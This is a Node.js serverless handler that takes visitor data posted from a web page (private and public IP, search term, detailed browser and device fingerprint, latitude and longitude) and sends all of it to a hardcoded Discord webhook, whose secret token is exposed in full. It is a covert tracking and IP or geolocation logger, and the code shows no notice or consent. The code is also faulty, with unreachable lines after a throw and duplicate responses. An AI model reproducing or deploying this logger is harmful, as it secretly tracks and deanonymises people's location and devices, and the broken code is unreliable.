import fetch from 'node-fetch';

export default async (req, res) => {
    if (req.method === 'POST') {
        const discordWebhookUrl = 'https://discord.com/api/webhooks/1303414607263826002/8u9YBbZiHiRm1dE2cO_wUFFYe6YFTkkouDgoZt-LIYTwVhtYJa1_AM-qDxXajHpWnnsT';

        try {
            const {
                ip,
                searchTerm,
                userAgent,
                browserLanguage,
                osInfo,
                browserVersion,
                connectionType,
                timeZone,
                deviceMemory,
                hardwareConcurrency,
                pixelRatio,
                onlineStatus,
                viewportWidth,
                viewportHeight,
                screenWidth,
                screenHeight,
                colorDepth,
                touchSupport,
                cookiesEnabled,
                plugins,
                referrer,
                currentURL,
                timestamp,
                latitude,
                longitude,
                geoLocation // This is the new data coming from the front-end
            } = req.body;

            // Get public IP from headers (proxy/IP forwarding)
            const publicIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

            // Send information to Discord
            const logMessage = {
                embeds: [
                    {
                        title: 'User Data Logged',
                        description: `
                            **Public IP:** \`${publicIP || 'N/A'}\`
                            **Private IP:** \`${ip || 'N/A'}\`
                            **Search Term:** \`${searchTerm || 'No search term entered'}\`
                            **User Agent:** \`${userAgent || 'N/A'}\`
                            **Browser Language:** \`${browserLanguage || 'N/A'}\`
                            **Operating System:** \`${osInfo || 'N/A'}\`
                            **Browser Version:** \`${browserVersion || 'N/A'}\`
                            **Connection Type:** \`${connectionType || 'N/A'}\`
                            **Time Zone:** \`${timeZone || 'N/A'}\`
                            **Device Memory:** \`${deviceMemory || 'N/A'} GB\`
                            **Hardware Concurrency:** \`${hardwareConcurrency || 'N/A'}\`
                            **Pixel Ratio:** \`${pixelRatio || 'N/A'}\`
                            **Online Status:** \`${onlineStatus || 'N/A'}\`
                            **Viewport Size:** \`${viewportWidth || 'N/A'} x ${viewportHeight || 'N/A'}\`
                            **Screen Resolution:** \`${screenWidth || 'N/A'} x ${screenHeight || 'N/A'}\`
                            **Color Depth:** \`${colorDepth || 'N/A'}\`
                            **Touch Support:** \`${touchSupport || 'N/A'}\`
                            **Cookies Enabled:** \`${cookiesEnabled || 'N/A'}\`
                            **Browser Plugins:** \`${plugins || 'N/A'}\`
                            **Referrer URL:** \`${referrer || 'No referrer'}\`
                            **Current URL:** \`${currentURL || 'N/A'}\`
                            **Latitude:** \`${latitude || 'N/A'}\`
                            **Longitude:** \`${longitude || 'N/A'}\`
                            **Timestamp:** \`${timestamp || new Date().toISOString()}\`
                            **Location (Latitude, Longitude):** \`${geoLocation.latitude}, ${geoLocation.longitude}\`
                        `,
                        color: 0x00FF00,
                        timestamp: new Date(),
                    },
                ],
            };

            const response = await fetch(discordWebhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(logMessage),
            });

            if (!response.ok) {
                throw new Error(`Failed to send log: ${response.statusText}`);
                const errorText = await response.text();
                console.error('Failed to send message to Discord:', response.status, errorText);
                return res.status(500).json({ message: 'Error sending to Discord' });
            }

            res.status(200).json({ message: 'Log data sent successfully.' });
            res.status(200).json({ message: 'User data logged successfully' });
        } catch (error) {
            res.status(500).json({ error: error.message });
            console.error('Error occurred:', error);
            res.status(500).json({ message: 'Error processing request' });
        }
    } else {
        res.status(405).json({ error: 'Method Not Allowed' });
        res.status(405).json({ message: 'Method Not Allowed' });
    }
};
